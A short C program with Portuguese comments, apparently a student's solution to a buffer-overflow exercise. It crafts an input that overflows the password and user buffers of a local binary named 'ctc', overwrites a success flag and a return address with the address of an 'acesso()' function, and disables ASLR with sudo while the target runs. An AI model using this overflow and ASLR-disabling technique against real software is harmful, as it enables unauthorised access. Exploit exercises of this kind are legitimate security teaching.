#include <stdio.h>
#include <stdlib.h>
#include <string.h>

//#define STR_SIZE 92 //Defina o tamanho do seu buffer aqui

int main(void) {

  FILE *f = fopen("./teste.in", "w+");
  int str_size;
  char str[103];
  //Você deve preparar a string de entrada (STDIN) aqui!
  unsigned long int temp;


  // Passando o binario do endereço de acesso() para uma string*/
  temp = 93824992235945;
  char acesso_adress[sizeof(long int)+1];
  memcpy(acesso_adress,&temp,sizeof(long int));
  acesso_adress[sizeof(long int)] = '\0';

  //Primeiro acesso
  strcpy(str,"SB\nMUITOSEGURO\n");
  
  //Overflow em PASS, modifica STD_SUCCESS
  strcat(str,"------------------------A BANDEIRA É MINHA\n");

  //Overflow em P_USER, modifica rbi de login para acesso() 
  strcat(str,"-----------------");
  //strcat(str,"--------");
  strcat(str,acesso_adress);

  /*Qualquer valor para P_PASS*/
  strcat(str,"\n----------");
  
  
  str_size = strlen(str);
  printf("%i\n",str_size);

  /*
  strcpy(str,overflow);
  strcat(str,acesso_adress);
  strcat(str,"\n-----------");
  str_size = strlen(str);
  */






  fwrite(str, 1, str_size, f);  
  fclose(f);

  system("sudo echo 0 > /proc/sys/kernel/randomize_va_space");
  system("./ctc < teste.in");
  system("sudo echo 2 > /proc/sys/kernel/randomize_va_space");
}
